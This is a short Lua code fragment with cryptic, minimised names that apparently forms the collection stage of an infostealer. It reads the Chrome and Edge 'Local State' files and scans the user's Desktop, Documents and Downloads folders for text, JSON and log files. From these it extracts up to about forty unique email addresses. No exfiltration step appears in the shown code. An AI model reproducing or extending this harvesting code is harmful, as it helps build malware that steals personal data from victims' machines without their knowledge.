local em, sm = {}, {}
local function gm(t)
    for m in t:gmatch("[%w%.%-_%+]+@[%w%.%-_]+%.[%a][%a]+") do
        if #m < 60 and not sm[m:lower()] then sm[m:lower()] = true; em[#em + 1] = m end
        if #em > 40 then return end
    end
end
for _, p in ipairs({
    LA and (LA .. "\\Google\\Chrome\\User Data\\Local State"),
    LA and (LA .. "\\Microsoft\\Edge\\User Data\\Local State"),
}) do
    local d = rf(p); if d then gm(d) end
end
for _, dir in ipairs({ UP and (UP .. "\\Desktop"), UP and (UP .. "\\Documents"), UP and (UP .. "\\Downloads") }) do
    for _, f in ipairs(ls(dir)) do
        if isf(f) and (f:match("%.txt$") or f:match("%.json$") or f:match("%.log$")) then
            local d = rf(f)
            if d and #d < 200000 then gm(d) end
        end
    end
end

